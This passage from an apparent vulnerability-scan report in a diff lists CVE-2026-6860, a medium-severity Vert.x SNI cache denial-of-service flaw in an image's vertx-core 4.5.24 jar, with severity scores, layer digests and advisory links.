+                        │      ╰ References       ╭ [0]: https://github.com/advisories/GHSA-84h7-rjj3-6jx4 
+                        │                         ├ [1]: https://github.com/netty/netty 
+                        │                         ╰ [2]: https://github.com/netty/netty/security/advisories/GHS
+                        │                                A-45q3-82m4-75jr 
+                        ╰ [10] ╭ VulnerabilityID : CVE-2026-6860 
+                               ├ VendorIDs        ─ [0]: GHSA-3g76-f9xq-8vp6 
+                               ├ PkgName         : io.vertx:vertx-core 
+                               ├ PkgPath         : openaf/Kube/vertx-core-4.5.24.jar 
+                               ├ PkgIdentifier    ╭ PURL: pkg:maven/io.vertx/vertx-core@4.5.24 
+                               │                  ╰ UID : afaef31c626f9650 
+                               ├ InstalledVersion: 4.5.24 
+                               ├ Status          : affected 
+                               ├ Layer            ╭ Digest: sha256:09eee20797c3531a147e8b2a45e5c61c3e133a853a7e
+                               │                  │         94edd8ebe468fc57d07e 
+                               │                  ╰ DiffID: sha256:7fc40f8e5dd6a10ab0b80575a425ca401ef012582a2a
+                               │                            e0961a5292bd158a4dcf 
+                               ├ SeveritySource  : ghsa 
+                               ├ PrimaryURL      : https://avd.aquasec.com/nvd/cve-2026-6860 
+                               ├ DataSource       ╭ ID  : ghsa 
+                               │                  ├ Name: GitHub Security Advisory Maven 
+                               │                  ╰ URL : https://github.com/advisories?query=type%3Areviewed+e
+                               │                          cosystem%3Amaven 
+                               ├ Fingerprint     : sha256:402e825f71c710b46b624b95e957653c7b813e603dcb729c60c4e
+                               │                   63420fb1f4d 
+                               ├ Title           : Vert.x has a DoS via unbounded server-side SNI SslContext
+                               │                   cache growth 
+                               ├ Description     : A TCP client can perform a TLS handshake and present the
+                               │                   server name extension with a server name that is accepted by
+                               │                    a server wildcard name, e.g. if the server is configured
+                               │                   with a certificate accepting *.example.com, any
+                               │                   XYZ.example.com where xyz is a valid name can be used. 
+                               ├ Severity        : MEDIUM 
+                               ├ VendorSeverity   ─ ghsa: 2 
+                               ├ CVSS             ─ ghsa ╭ V3Vector : CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/
+                               │                         │            A:L 
+                               │                         ├ V40Vector: CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:N/VC:N/VI
+                               │                         │            :N/VA:L/SC:N/SI:N/SA:L 
+                               │                         ├ V3Score  : 5.3 
+                               │                         ╰ V40Score : 6.9 
+                               ├ References       ╭ [0]: https://github.com/eclipse-vertx/vert.x 
+                               │                  ├ [1]: https://github.com/eclipse-vertx/vert.x/pull/6102 
+                               │                  ├ [2]: https://github.com/eclipse-vertx/vert.x/security/advis
+                               │                  │      ories/GHSA-3g76-f9xq-8vp6 
+                               │                  ├ [3]: https://gitlab.eclipse.org/security/vulnerability-repo
+                               │                  │      rts/-/issues/381 
+                               │                  ╰ [4]: https://nvd.nist.gov/vuln/detail/CVE-2026-6860 
+                               ├ PublishedDate   : 2026-05-06T10:16:26.293Z 
+                               ╰ LastModifiedDate: 2026-05-07T14:52:27.38Z 
 ```
